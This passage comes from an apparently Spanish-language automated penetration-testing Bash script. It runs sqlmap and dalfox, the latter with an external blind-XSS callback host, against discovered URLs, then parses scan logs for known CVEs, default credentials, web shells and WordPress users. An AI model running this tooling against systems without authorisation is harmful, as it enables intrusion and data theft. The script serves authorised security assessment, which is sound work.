							for url in `cat logs/enumeracion/"$host"_parametrosGET_uniq_final.txt 2>/dev/null`; do
								echo -e "$OKBLUE+ -- --=############ Revisando $url (SQLi/XSS) #########$RESET"

								echo -e "$OKBLUE+ -- --=############ Probando SQL inyection. #########$RESET"
								echo  "$url" | tee -a logs/vulnerabilidades/"$host"_"web$i"_sqlmap.txt
								sqlmap -u "$url" --batch --tamper=space2comment --threads 5 | tee -a logs/vulnerabilidades/"$host"_"web$i"_sqlmap.txt
								sqlmap -u "$url" --batch  --technique=B --risk=3  --threads 5 | tee -a logs/vulnerabilidades/"$host"_"web$i"_sqlmapBlind.txt

								#  Buscar SQLi
								egrep -iq "is vulnerable" logs/vulnerabilidades/"$host"_"web$i"_sqlmap.txt
								greprc=$?
								if [[ $greprc -eq 0 ]] ; then
									echo -e "\t$OKRED[!] Inyeccion SQL detectada \n $RESET"
									echo "sqlmap -u \"$url\" --batch " > .vulnerabilidades/"$host"_"web$i"_sqlmap.txt

									# CS-58 Inyecciones SQL
									cat .vulnerabilidades/"$host"_"web$i"_sqlmap.txt >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-58.txt
									cat .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-58.txt >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-58.txt
								fi

								#  Buscar SQLi blind
								egrep -iq "is vulnerable" logs/vulnerabilidades/"$host"_"web$i"_sqlmapBlind.txt
								greprc=$?
								if [[ $greprc -eq 0 ]] ; then
									echo -e "\t$OKRED[!] Inyeccion SQL detectada \n $RESET"
									echo "sqlmap -u \"$url\" --batch  --technique=B --risk=3" > .vulnerabilidades/"$host"_"web$i"_sqlmapBlind.txt

									# CS-58 Inyecciones SQL
									cat .vulnerabilidades/"$host"_"web$i"_sqlmapBlind.txt >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-58.txt
									cat .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-58.txt >> logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-58.txt
								fi

								#  Buscar XSS
								dalfox -b hahwul.xss.ht url $url | tee -a logs/vulnerabilidades/"$host"_"web$i"_xss.txt
								#https://z0id.xss.ht/


								egrep -iq "Triggered XSS Payload" logs/vulnerabilidades/"$host"_"web$i"_xss.txt
								greprc=$?
								if [[ $greprc -eq 0 ]] ; then
									echo -e "\t$OKRED[!] XSS detectada \n $RESET"
									echo "url $url" >  .vulnerabilidades/"$host"_"web$i"_xss.txt
									egrep -ia "Triggered XSS Payload" logs/vulnerabilidades/"$host"_"web$i"_xss.txt >> .vulnerabilidades/"$host"_"web$i"_xss.txt
									# CS-59 XSS
									cat .vulnerabilidades/"$host"_"web$i"_xss.txt >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-59.txt
									cat .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-59.txt > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-59.txt
								fi

								i=$(( i + 1 ))

							done # xss
							#####################
						fi #oscp
					fi #total

					echo -e "\n"
					######
				else
					echo -e "\t\t[+] Redirección, error de proxy detectado o sitio ya escaneado \n"
				fi

			else
				if [ "$VERBOSE" == '1' ]; then  echo -e "NO escanear $proto_http://$host:$port/"; fi
			fi #hosting
#######3
		fi


	done # subdominios
done #for navegacino forzada

waitFinish

if [ "$VERBOSE" == '1' ]; then  echo " IP_LIST_FILE $IP_LIST_FILE"; fi


####### PARSE ########
echo "webScaneado $webScaneado"
if [[ $webScaneado -eq 1 ]]; then
	##########  Filtrar los directorios que respondieron 200 OK (llevarlos a .enumeracion) ################
	# echo -e "$OKBLUE [i] Filtrar los directorios descubiertos que respondieron 200 OK (llevarlos a .enumeracion) $RESET"
	# touch logs/enumeracion/canary_webdirectorios.txt # se necesita al menos 2 archivos *_webdirectorios.txt
	# egrep --color=never "^200" logs/enumeracion/*webdirectorios.txt 2>/dev/null| while read -r line ; do
	# 	#echo -e  "$OKRED[!] Listado de directorio detectado $RESET"
	# 	archivo_origen=`echo $line | cut -d ':' -f1`
	# 	contenido=`echo $line | cut -d ':' -f2-6`
	# 	#echo "archivo_origen $archivo_origen"
	# 	archivo_destino=$archivo_origen
	# 	archivo_destino=${archivo_destino/logs\/enumeracion/.enumeracion}
	# 	#200	http://192.168.50.154:80/img/ (Listado directorio activo)	 TRACE
	# 	#echo "contenido $contenido"
	# 	echo $contenido >> $archivo_destino
	# done

	for line in $(cat $TARGETS); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		proto_http=`echo $line | cut -f3 -d":"`
		if [ -z $DOMINIO ] ; then
			lista_hosts=`grep --color=never $ip $IP_LIST_FILE  | egrep 'DOMINIO|subdomain|vhost'| cut -d "," -f2`
			if [ -z "$lista_hosts" ] ; then
					lista_hosts=$ip
			else
					lista_hosts=`echo -e "$lista_hosts\n$ip"|uniq`
			fi
		else
			lista_hosts=$ip
		fi

		for host in $lista_hosts; do
			echo -e "Parse $host:$port"

			[ ! -e ".enumeracion2/${host}_${port}-${path_web_sin_slash}_joomla-version.txt" ] && cp logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_joomla-version.txt .enumeracion/"$host"_"$port-$path_web_sin_slash"_joomla-version.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}_SharePoint.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_SharePoint.txt >> .enumeracion/"$host"_"$port-$path_web_sin_slash"_SharePoint.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}-${path_web_sin_slash}_webadmin.txt" ] && egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webadmin.txt > .enumeracion/"$host"_"$port-$path_web_sin_slash"_webadmin.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}-${path_web_sin_slash}_webdirectorios.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt > .enumeracion/"$host"_"$port-$path_web_sin_slash"_webdirectorios.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}-${path_web_sin_slash}_archivosSAP.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_archivosSAP.txt > .enumeracion/"$host"_"$port-$path_web_sin_slash"_archivosSAP.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}-${path_web_sin_slash}_custom.txt" ] && egrep --color=never "^200|^500" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_custom.txt > .enumeracion/"$host"_"$port-$path_web_sin_slash"_custom.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_webarchivos.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}-${path_web_sin_slash}_webarchivos.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webserver.txt >> .enumeracion/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}-${path_web_sin_slash}_webarchivos.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_api.txt >> .enumeracion/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}-${path_web_sin_slash}_webarchivos.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_php-files.txt >> .enumeracion/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}-${path_web_sin_slash}_webarchivos.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_archivosTomcat.txt >> .enumeracion/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}-${path_web_sin_slash}_webarchivos.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_asp-files.txt >> .enumeracion/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}-${path_web_sin_slash}_webarchivos.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_jsp-files.txt >> .enumeracion/"$host"_"$port-$path_web_sin_slash"_webarchivos.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}_cert.txt" ] && grep commonName logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_cert.txt > .enumeracion/"$host"_"$port-$path_web_sin_slash"_cert.txt 2> /dev/null
			[ ! -e ".enumeracion2/${host}_${port}_shortname.txt" ] && egrep '\[+\]' logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_shortname.txt 2>/dev/null |  sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" >> .enumeracion/"$host"_"$port-$path_web_sin_slash"_shortname.txt
			[ ! -e ".enumeracion2/${host}_${port}-${path_web_sin_slash}_archivosCGI.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_archivosCGI.txt > .enumeracion/"$host"_"$port-$path_web_sin_slash"_archivosCGI.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}_certsrv.txt" ] && grep --color=never "401" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_certsrv.txt > .enumeracion/"$host"_"$port-$path_web_sin_slash"_certsrv.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}_hadoopNamenode.txt" ] && grep --color=never "|" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_hadoopNamenode.txt 2>/dev/null | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .enumeracion/"$host"_"$port-$path_web_sin_slash"_hadoopNamenode.txt
			[ ! -e ".enumeracion2/"$host"_"$port-$path_web_sin_slash"_webData.txt" ] && grep -v 'Error1 Get' logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt > .enumeracion/"$host"_"$port-$path_web_sin_slash"_webData.txt 2>/dev/null
			[ ! -e ".enumeracion2/${host}_${port}_droopescan.txt" ] && cat logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_droopescan.txt > .enumeracion/"$host"_"$port-$path_web_sin_slash"_droopescan.txt 2>/dev/null

			[ ! -e ".vulnerabilidades2/${host}_${port}_passwordDefecto.txt" ] && grep -i 'valid credentials' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_passwordDefecto.txt 2>/dev/null | sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" > .vulnerabilidades/"$host"_"$port"_passwordDefecto.txt
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_configuracionInseguraYii.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_yiiTest.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_configuracionInseguraYii.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_backupweb.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_backupweb.txt >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_backupweb.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_archivosDefecto.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosDefecto.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosDefecto.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_archivosPeligrosos.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_openWebservice.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_openWebservice.txt >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_openWebservice.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_webshell.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webshell.txt >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_webshell.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_divulgacionInformacion.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_divulgacionInformacion.txt > .enumeracion/"$host"_"$port-$path_web_sin_slash"_divulgacionInformacion.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_phpinfo.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_phpinfo.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_phpinfo.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_cms-registroHabilitado.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_cms-registroHabilitado.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_cms-registroHabilitado.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_CVE-2024-24919.txt" ] && grep "^200" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CVE-2024-24919.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CVE-2024-24919.txt

			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_HTTPsys.txt" ] && grep --color=never "|" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_HTTPsys.txt 2>/dev/null | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_HTTPsys.txt
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_IISwebdavVulnerable.txt" ] && grep --color=never "|" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_IISwebdavVulnerable.txt 2>/dev/null | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_IISwebdavVulnerable.txt
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_nmapHTTPvuln.txt" ] && grep --color=never "|" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_nmapHTTPvuln.txt 2>/dev/null |  egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_nmapHTTPvuln.txt
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_sapNetweaverLeak.txt" ] && grep --color=never "|" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_sapNetweaverLeak.txt 2>/dev/null |  egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_sapNetweaverLeak.txt
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_confTLS.txt" ] && grep -i --color=never "incorrecta" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_confTLS.txt 2>/dev/null | egrep -iv "Vulnerable a" | cut -d '.' -f2-4 > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_confTLS.txt
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_vulTLS.txt" ] && grep -i --color=never "Certificado expirado" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_vulTLS.txt 2>/dev/null | cut -d '.' -f2-4 >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_vulTLS.txt && grep -i --color=never "VULNERABLE" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_vulTLS.txt 2>/dev/null | cut -d '.' -f2-4 >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_vulTLS.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_sap-scan.txt" ] && egrep --color=never "200|vulnerable" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_sap-scan.txt >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_sap-scan.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_citrixVul.txt" ] && egrep --color=never "root" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_citrixVul.txt 2>/dev/null | grep -vi 'error' > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_citrixVul.txt
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_CVE-2020-0688.txt" ] && egrep --color=never "VULNERABLE" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CVE-2020-0688.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CVE-2020-0688.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_apacheTraversal.txt" ] && egrep --color=never ":x:" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apacheTraversal.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apacheTraversal.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_bigIPVul.txt" ] && egrep --color=never ":x:" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_bigIPVul.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_bigIPVul.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_pulseVul.txt" ] && egrep --color=never ":x:" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_pulseVul.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_pulseVul.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_apacheStruts.txt" ] && egrep -i "Apache Struts Vulnerable" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apacheStruts.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apacheStruts.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_cve-2021-41773.txt" ] && egrep uid logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_cve-2021-41773.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_cve-2021-41773.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_CGIServlet.txt" ] && egrep 'WEB-INF' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CGIServlet.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CGIServlet.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_proxynoshell.txt" ] && egrep '\[info\]' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_proxynoshell.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_proxynoshell.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_proxyshell.txt" ] && egrep '\[info\]' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_proxyshell.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_proxyshell.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_cve2020-3452.txt" ] && egrep --color=never "INTERNAL_PASSWORD_ENABLED" logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_cve2020-3452.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_cve2020-3452.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_wordpressGhost.txt" ] && egrep '\[+\]' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wordpressGhost.txt 2>/dev/null |  sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" >> .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wordpressGhost.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_wordpressCVE~2022~21661.txt" ] && grep -i 'vulnerable' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wordpressCVE~2022~21661.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wordpressCVE~2022~21661.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_wordpressPlugins.txt" ] && grep -i 'vulnerable' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wordpressPlugins.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wordpressPlugins.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_xml-rpc-habilitado.txt" ] && grep -i 'demo.sayHello' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_xml-rpc-habilitado.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_xml-rpc-habilitado.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_xml-rpc-login.txt" ] && grep -i 'incorrect' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_xml-rpc-login.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_xml-rpc-login.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_chamilo-CVE~2023~34960.txt" ] && grep -i 'vulnerable' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_chamilo-CVE~2023~34960.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_chamilo-CVE~2023~34960.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_apacheNuclei.txt" ] && egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apacheNuclei.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_apacheNuclei.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_tomcatNuclei.txt" ] && egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_tomcatNuclei.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_tomcatNuclei.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_joomlaNuclei.txt" ] && egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomlaNuclei.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_joomlaNuclei.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_wordpressNuclei.txt" ] && egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wordpressNuclei.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wordpressNuclei.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_drupalNuclei.txt" ] && egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_drupalNuclei.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_drupalNuclei.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_yiiNuclei.txt" ] && egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_yiiNuclei.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_yiiNuclei.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_laravelNuclei.txt" ] && egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_laravelNuclei.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_laravelNuclei.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/${host}_${port}-${path_web_sin_slash}_laravel-rce-CVE-2021-3129.txt" ] && grep root logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_laravel-rce-CVE-2021-3129.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_laravel-rce-CVE-2021-3129.txt 2>/dev/null
			[ ! -e ".vulnerabilidades2/"$host"_"$port-$path_web_sin_slash"_CMSDesactualizado.txt" ] && egrep -v 'Couldnt|Running|juumla.sh|returned' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CMSDesactualizado.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CMSDesactualizado.txt 2>/dev/null
			
			[ ! -e "logs/vulnerabilidades/${host}_${port}-${path_web_sin_slash}_wpUsers.txt" ] && cat logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wpUsers.json 2>/dev/null | wpscan-parser.py 2>/dev/null | awk {'print $2'} > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wpUsers.txt 2>/dev/null
			[ ! -e "logs/vulnerabilidades/${host}_${port}-${path_web_sin_slash}_CS-39.txt" ] && cp logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_archivosPeligrosos.txt logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-39.txt 2>/dev/null
			[ ! -e "logs/vulnerabilidades/${host}_${port}-${path_web_sin_slash}_CS-45.txt" ] && cp logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_testSSL.txt logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CS-45.txt 2>/dev/null
			[ ! -e "logs/vulnerabilidades/${host}_${port}-${path_web_sin_slash}_confTLS.txt" ] && grep --color=never 'Grade cap ' -m1 -b1 -A20 logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_testSSL.txt > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_confTLS.txt 2>/dev/null
			[ ! -e "logs/vulnerabilidades/${host}_${port}-${path_web_sin_slash}_vulTLS.txt" ] && grep --color=never 'Grade cap ' -m1 -b1 -A20 logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_testSSL.txt > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_vulTLS.txt 2>/dev/null
			
			[ ! -e "servicios/cgi.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_archivosCGI.txt 2>/dev/null | awk '{print $2}' >> servicios/cgi.txt


		if [ ! -e "logs/vulnerabilidades/${host}_${port}-${path_web_sin_slash}_configuracionInseguraWordpress.txt" ]; then
			#####wordpress
			grep '!' logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wpscan.txt 2>/dev/null | egrep -vi 'identified|version|\+' | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_CMSDesactualizado.txt
			strings logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wpscan.txt 2>/dev/null| grep --color=never "XML-RPC seems" -m1 -b1 -A9 > logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_configuracionInseguraWordpress.txt 2>/dev/null

			for username in `cat logs/vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_wpUsers.txt`
			do
				if [ "$VERBOSE" == '1' ]; then echo "probando si $username es valido"; fi
				respuesta=``
				validate-wordpress-user -url $proto_http://$host:$port/ -username "$username" > logs/enumeracion/"$username"_valid.txt
				sleep 2
				egrep -qi "no existe" logs/enumeracion/"$username"_valid.txt 2>/dev/null
				greprc=$? # $greprc -eq 0 --> no existe el usuario

				if [[ ( $greprc -eq 0 && ${username} == *"-"* && ! -z $DOMINIO )]];then
